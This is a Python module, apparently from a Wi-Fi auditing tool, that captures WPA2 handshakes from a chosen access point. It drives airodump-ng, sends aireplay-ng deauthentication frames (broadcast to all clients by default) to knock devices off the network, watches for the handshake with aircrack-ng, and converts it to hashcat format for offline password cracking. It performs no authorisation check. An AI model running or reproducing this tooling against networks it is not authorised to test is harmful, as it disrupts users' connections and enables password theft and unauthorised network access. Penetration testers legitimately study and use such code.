"""
core/capture.py — WPA2 handshake capture using airodump-ng + aireplay-ng deauth
"""

import glob
import os
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass
from typing import Callable, Optional


@dataclass
class CaptureResult:
    success: bool
    cap_file: str  # Path to .cap file
    hc22000_file: str  # Path to hashcat-compatible file (if converted)
    message: str


class HandshakeCapturer:
    """
    Captures WPA2 4-way handshake for a target AP.
    Optionally sends deauth frames to speed up capture.
    """

    def __init__(
        self,
        iface: str,
        bssid: str,
        channel: int,
        on_log: Callable[[str], None],
        on_handshake: Callable[[CaptureResult], None],
        client_mac: str = "FF:FF:FF:FF:FF:FF",
    ):
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.on_log = on_log
        self.on_handshake = on_handshake
        self.client_mac = client_mac
        self._stop_event = threading.Event()
        self._tmpdir = tempfile.mkdtemp(prefix="wifiaudit_cap_")
        self._prefix = os.path.join(self._tmpdir, "handshake")
        self._cap_proc: Optional[subprocess.Popen] = None
        self._deauth_proc: Optional[subprocess.Popen] = None
        self._monitor_thread: Optional[threading.Thread] = None

    def start(self, send_deauth: bool = True, deauth_count: int = 5):
        self._stop_event.clear()
        self.on_log(f"[*] Setting channel to {self.channel}...")
        subprocess.run(
            ["iw", "dev", self.iface, "set", "channel", str(self.channel)],
            capture_output=True,
        )

        self.on_log(f"[*] Starting capture on {self.bssid}...")
        cap_cmd = [
            "airodump-ng",
            "--bssid",
            self.bssid,
            "--channel",
            str(self.channel),
            "--write",
            self._prefix,
            "--output-format",
            "pcap",
            "--write-interval",
            "2",
            self.iface,
        ]
        self._cap_proc = subprocess.Popen(
            cap_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        if send_deauth:
            time.sleep(2)  # Let capture start first
            self.on_log(
                f"[*] Sending {deauth_count} deauth frames to {self.client_mac}..."
            )
            deauth_cmd = [
                "aireplay-ng",
                "--deauth",
                str(deauth_count),
                "-a",
                self.bssid,
                "-c",
                self.client_mac,
                self.iface,
            ]
            self._deauth_proc = subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            stdout, _ = self._deauth_proc.communicate()
            for line in stdout.splitlines():
                if line.strip():
                    self.on_log(f"    {line.strip()}")

        self._monitor_thread = threading.Thread(
            target=self._watch_for_handshake, daemon=True
        )
        self._monitor_thread.start()

    def _watch_for_handshake(self):
        """Poll the .cap file with aircrack-ng to detect a handshake."""
        cap_path = self._prefix + "-01.cap"
        elapsed = 0
        max_wait = 120  # seconds

        while not self._stop_event.is_set() and elapsed < max_wait:
            time.sleep(3)
            elapsed += 3

            if not os.path.exists(cap_path):
                self.on_log(f"[~] Waiting for capture file... ({elapsed}s)")
                continue

            # Check for handshake using aircrack-ng
            r = subprocess.run(
                ["aircrack-ng", cap_path], capture_output=True, text=True
            )
            output = r.stdout + r.stderr
            if "1 handshake" in output or "WPA handshake" in output:
                self.on_log("[✓] WPA2 handshake captured!")
                self.stop()
                hc_file = self._convert_to_hc22000(cap_path)
                result = CaptureResult(
                    success=True,
                    cap_file=cap_path,
                    hc22000_file=hc_file,
                    message="Handshake captured successfully.",
                )
                self.on_handshake(result)
                return
            else:
                self.on_log(
                    f"[~] No handshake yet ({elapsed}s) — waiting for client reconnect..."
                )

        if not self._stop_event.is_set():
            # Timeout
            cap_path_exists = os.path.exists(cap_path)
            self.on_log(
                "[!] Capture timed out. Try sending more deauth frames or wait for a client."
            )
            self.stop()
            self.on_handshake(
                CaptureResult(
                    success=False,
                    cap_file=cap_path if cap_path_exists else "",
                    hc22000_file="",
                    message="Timeout: no handshake detected.",
                )
            )

    def _convert_to_hc22000(self, cap_path: str) -> str:
        """Convert .cap to hashcat's hc22000 format using hcxtools."""
        hc_path = cap_path.replace(".cap", ".hc22000")
        r = subprocess.run(
            ["hcxpcapngtool", "-o", hc_path, cap_path], capture_output=True, text=True
        )
        if r.returncode == 0 and os.path.exists(hc_path):
            self.on_log(f"[✓] Converted to hc22000: {hc_path}")
            return hc_path
        else:
            self.on_log(
                "[!] hcxpcapngtool not found — hashcat mode unavailable. Install hcxtools."
            )
            return ""

    def stop(self):
        self._stop_event.set()
        if self._cap_proc:
            self._cap_proc.terminate()
            try:
                self._cap_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self._cap_proc.kill()

    def get_cap_path(self) -> str:
        return self._prefix + "-01.cap"

    def cleanup(self):
        import shutil

        shutil.rmtree(self._tmpdir, ignore_errors=True)
